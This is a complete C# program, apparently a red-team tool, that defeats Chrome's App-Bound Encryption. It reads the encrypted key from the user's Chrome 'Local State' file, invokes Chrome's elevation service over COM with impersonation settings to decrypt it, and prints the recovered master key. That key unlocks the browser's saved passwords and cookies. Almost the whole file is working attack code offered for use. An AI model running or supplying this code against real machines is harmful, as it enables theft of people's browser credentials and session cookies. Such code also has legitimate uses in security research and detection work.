using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Diagnostics;

namespace ChromeAppBound
{
    class Program
    {
        [DllImport("ole32.dll")]
        public static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

        [DllImport("ole32.dll")]
        public static extern void CoUninitialize();

        [DllImport("ole32.dll")]
        public static extern int CoCreateInstance(
            ref Guid clsid,
            IntPtr pUnkOuter,
            uint dwClsContext,
            ref Guid iid,
            out IntPtr ppv);

        [DllImport("ole32.dll")]
        public static extern int CoSetProxyBlanket(
            IntPtr pProxy,
            uint dwAuthnSvc,
            uint dwAuthzSvc,
            IntPtr pServerPrincName,
            uint dwAuthnLevel,
            uint dwImpLevel,
            IntPtr pAuthInfo,
            uint dwCapabilities);

        [DllImport("oleaut32.dll")]
        public static extern IntPtr SysStringByteLen(IntPtr bstr);

        [DllImport("oleaut32.dll")]
        public static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);

        [DllImport("oleaut32.dll")]
        public static extern void SysFreeString(IntPtr bstr);

        private static readonly byte[] KeyPrefix = { (byte)'A', (byte)'P', (byte)'P', (byte)'B' };

        private static void DisplayBanner()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("----------------------------------------------");
            Console.WriteLine("|  Chrome App-Bound Encryption - Decryption  |");
            Console.WriteLine("|  RowTeam (@rcoil)                          |");
            Console.WriteLine("----------------------------------------------");
            Console.WriteLine("");
            Console.ResetColor();
        }

        private static byte[] RetrieveEncryptedKeyFromLocalState()
        {
            Console.WriteLine("[+] Retrieving AppData path.");

            var appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var localStatePath = Path.Combine(appDataPath, @"Google\Chrome\User Data\Local State");

            Console.WriteLine("[+] Local State path: " + localStatePath);

            if (!File.Exists(localStatePath))
            {
                Console.WriteLine("[!] Could not open the Local State file.");
                return new byte[0];
            }

            var fileContent = File.ReadAllText(localStatePath);
            var searchKey = "\"app_bound_encrypted_key\":\"";
            var keyStartPos = fileContent.IndexOf(searchKey);

            if (keyStartPos == -1)
            {
                Console.WriteLine("[!] 'app_bound_encrypted_key' not found in Local State file.");
                return new byte[0];
            }

            keyStartPos += searchKey.Length;
            var keyEndPos = fileContent.IndexOf('"', keyStartPos);

            if (keyEndPos == -1)
            {
                Console.WriteLine("[!] Malformed 'app_bound_encrypted_key' in Local State file.");
                return new byte[0];
            }

            var base64_encrypted_key = fileContent.Substring(keyStartPos, keyEndPos - keyStartPos);

            try
            {
                var encrypted_key_with_header = Convert.FromBase64String(base64_encrypted_key);

                if (encrypted_key_with_header.Length < KeyPrefix.Length)
                {
                    Console.WriteLine("[!] Invalid key format - too short.");
                    return new byte[0];
                }

                if (!KeyPrefix.SequenceEqual(encrypted_key_with_header.Take(KeyPrefix.Length)))
                {
                    Console.WriteLine("[!] Invalid key header.");
                    return new byte[0];
                }

                Console.WriteLine("[+] Key header is valid.");
                return encrypted_key_with_header.Skip(KeyPrefix.Length).ToArray();
            }
            catch (FormatException)
            {
                Console.WriteLine("[!] Invalid Base64 encoded key.");
                return new byte[0];
            }
        }

        private static string BytesToHexString(byte[] byteArray)
        {
            return BitConverter.ToString(byteArray).Replace("-", "").ToLower();
        }

        private static void PrintChromeVersion(string chromePath)
        {
            try
            {
                if (File.Exists(chromePath))
                {
                    var versionInfo = FileVersionInfo.GetVersionInfo(chromePath);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Found Chrome Version: " + versionInfo.FileVersion);
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] Chrome executable not found at: " + chromePath);
                    Console.ResetColor();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Could not get version info for " + chromePath + ": " + ex.Message);
                Console.ResetColor();
            }
        }

        enum ProtectionLevel
        {
            PROTECTION_NONE = 0,
            PROTECTION_PATH_VALIDATION_OLD = 1,
            PROTECTION_PATH_VALIDATION = 2,
            PROTECTION_MAX = 3
        }

        [ComImport, Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IElevator
        {
            int RunRecoveryCRXElevated(
                string crxPath,
                string browserAppId,
                string browserVersion,
                string sessionId,
                uint callerProcessId,
                out IntPtr processHandle);

            int EncryptData(
                ProtectionLevel protectionLevel,
                IntPtr plaintext,
                out IntPtr ciphertext,
                out uint lastError);

            int DecryptData(
                IntPtr ciphertext,
                out IntPtr plaintext,
                out uint lastError);
        }

        static byte[] EncryptData(IElevator elevator, byte[] plaintext)
        {
            IntPtr plaintextPtr = SysAllocStringByteLen(plaintext, (uint)plaintext.Length);
            if (plaintextPtr == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory for plaintext.");
            }

            IntPtr ciphertext = IntPtr.Zero;
            try
            {
                int hr = elevator.EncryptData(
                    ProtectionLevel.PROTECTION_PATH_VALIDATION,
                    plaintextPtr,
                    out ciphertext,
                    out uint lastError);

                if (hr < 0)
                {
                    throw new COMException("EncryptData failed with HRESULT: 0x" + hr.ToString("X"), hr);
                }

                int ciphertextLength = (int)SysStringByteLen(ciphertext);
                byte[] encryptedBytes = new byte[ciphertextLength];

                Marshal.Copy(ciphertext, encryptedBytes, 0, ciphertextLength);
                return encryptedBytes;
            }
            finally
            {
                if (plaintextPtr != IntPtr.Zero)
                    SysFreeString(plaintextPtr);
                if (ciphertext != IntPtr.Zero)
                    SysFreeString(ciphertext);
            }
        }

        static byte[] DecryptData(IElevator elevator, byte[] encrypted_key)
        {
            if (encrypted_key == null || encrypted_key.Length == 0)
            {
                Console.WriteLine("[!] No encrypted key provided for decryption.");
                return null;
            }

            IntPtr bstrPtr = SysAllocStringByteLen(encrypted_key, (uint)encrypted_key.Length);
            if (bstrPtr == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to allocate memory for encrypted key.");
                return null;
            }

            IntPtr data = IntPtr.Zero;
            try
            {
                int hr = elevator.DecryptData(bstrPtr, out data, out uint lastError);

                if (hr < 0)
                {
                    Console.WriteLine($"[!] DecryptData failed with HRESULT: 0x{hr:X}, LastError: {lastError}");
                    return null;
                }

                int byteLength = (int)SysStringByteLen(data);
                if (byteLength == 0)
                {
                    Console.WriteLine("[!] Decrypted data is empty.");
                    return null;
                }

                byte[] bytes = new byte[byteLength];
                Marshal.Copy(data, bytes, 0, byteLength);
                return bytes;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Exception during decryption: {e.Message}");
                return null;
            }
            finally
            {
                if (bstrPtr != IntPtr.Zero)
                    SysFreeString(bstrPtr);
                if (data != IntPtr.Zero)
                    SysFreeString(data);
            }
        }

        static void Main(string[] args)
        {
            DisplayBanner();

            // Check multiple common Chrome installation paths
            string[] chromePaths = {
                @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                Environment.ExpandEnvironmentVariables(@"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe")
            };

            bool chromeFound = false;
            foreach (string path in chromePaths)
            {
                if (File.Exists(path))
                {
                    PrintChromeVersion(path);
                    chromeFound = true;
                    break;
                }
            }

            if (!chromeFound)
            {
                Console.WriteLine("[!] Chrome installation not found in common locations.");
            }

            Console.WriteLine("[*] Starting Chrome App-Bound Encryption Decryption process.");

            // Initialize COM
            const uint COINIT_APARTMENTTHREADED = 0x2;
            int comResult = CoInitializeEx(IntPtr.Zero, COINIT_APARTMENTTHREADED);
            if (comResult < 0 && comResult != unchecked((int)0x80010106)) // RPC_E_CHANGED_MODE
            {
                Console.WriteLine($"[!] Failed to initialize COM: 0x{comResult:X}");
                return;
            }

            try
            {
                const uint CLSCTX_LOCAL_SERVER = 0x4;
                const uint RPC_C_AUTHN_DEFAULT = 0xffffffff;
                const uint RPC_C_AUTHZ_DEFAULT = 0xffffffff;
                const uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
                const uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
                const uint EOAC_DYNAMIC_CLOAKING = 0x40;

                Guid elevatorClsid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
                Guid elevatorIid = typeof(IElevator).GUID;

                IntPtr elevatorPtr;
                int hr = CoCreateInstance(ref elevatorClsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref elevatorIid, out elevatorPtr);

                if (hr < 0)
                {
                    Console.WriteLine($"[!] Failed to create COM instance: 0x{hr:X}");
                    Console.WriteLine("[!] Make sure Chrome is installed and the elevation service is available.");
                    return;
                }

                try
                {
                    IElevator elevator = (IElevator)Marshal.GetObjectForIUnknown(elevatorPtr);

                    hr = CoSetProxyBlanket(
                        elevatorPtr,
                        RPC_C_AUTHN_DEFAULT,
                        RPC_C_AUTHZ_DEFAULT,
                        IntPtr.Zero,
                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                        RPC_C_IMP_LEVEL_IMPERSONATE,
                        IntPtr.Zero,
                        EOAC_DYNAMIC_CLOAKING);

                    if (hr < 0)
                    {
                        Console.WriteLine($"[!] Failed to set proxy blanket: 0x{hr:X}");
                        return;
                    }

                    var encrypted_key = RetrieveEncryptedKeyFromLocalState();
                    if (encrypted_key.Length == 0)
                    {
                        Console.WriteLine("[!] No encrypted key retrieved. Exiting.");
                        return;
                    }

                    Console.WriteLine("[+] Encrypted key retrieved: " + BytesToHexString(encrypted_key.Take(20).ToArray()) + "...");

                    var plaintext = DecryptData(elevator, encrypted_key);

                    if (plaintext != null && plaintext.Length > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[+] Decrypted Key: " + BytesToHexString(plaintext));
                        Console.ResetColor();
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to decrypt the key.");
                    }
                }
                finally
                {
                    if (elevatorPtr != IntPtr.Zero)
                    {
                        Marshal.Release(elevatorPtr);
                    }
                }
            }
            finally
            {
                CoUninitialize();
            }

            Console.WriteLine("\n[*] Process completed. Press any key to exit...");
            Console.ReadKey();
        }
    }
}
